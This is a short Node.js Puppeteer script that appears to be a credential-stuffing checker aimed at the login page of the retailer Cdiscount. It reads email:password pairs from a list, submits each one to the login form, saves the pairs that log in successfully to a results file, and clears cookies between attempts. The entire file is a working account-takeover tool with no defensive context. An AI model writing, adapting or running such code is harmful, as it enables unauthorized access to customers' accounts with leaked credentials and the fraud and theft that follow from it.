const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');
(async () => {
     fs.readFile('C:/Users/kalag/Desktop/handmadechecker/Cdiscount/maillist.txt','utf8', async (err,data)=>{
        const browser = await puppeteer.launch();
        const page = await browser.newPage();
        const dataArray=data.split("\r\n");
        for(let line of dataArray){
            await page.goto('https://order.cdiscount.com/Account/LoginLight.html?referrer=');
            let parsedLine= line.split(':');
            console.log("ParsedDAte",parsedLine)
            if(page.url()==='https://order.cdiscount.com/Account/LoginLight.html?referrer='){
                await (await page.$('input[id="CustomerLogin_CustomerLoginFormData_Email" ]')).type(parsedLine[0].toString())
                await (await page.$('input[id="CustomerLogin_CustomerLoginFormData_Password"]')).type(parsedLine[1].toString())
                await (await page.$('input[class="sbt btGreen"]')).click()
                await Promise.all([
                console.log('Click Send Done'),
                await page.waitForNavigation({ waitUntil: 'networkidle0' })
                ]);
                if(page.url()==='https://clients.cdiscount.com/Account/Home.html'){
                    console.log("SUCCESs");

                    fs.appendFile('C:/Users/kalag/Desktop/handmadechecker/Cdiscount/result.txt', parsedLine[0]+":"+parsedLine[1]+"\r\n", function (err) {
                        if (err) throw err;
                        console.log('Saved!');
                      });
                    await page.goto('https://order.cdiscount.com/Account/LoginLight.html?referrer=');
                    const client = await page.target().createCDPSession();
                    await client.send('Network.clearBrowserCookies');
                    await client.send('Network.clearBrowserCache');
                }
            }else{
                console.log("BIG ERRORrr... Exiting");
                await browser.close();
            }
        }
        await browser.close();

    })

})();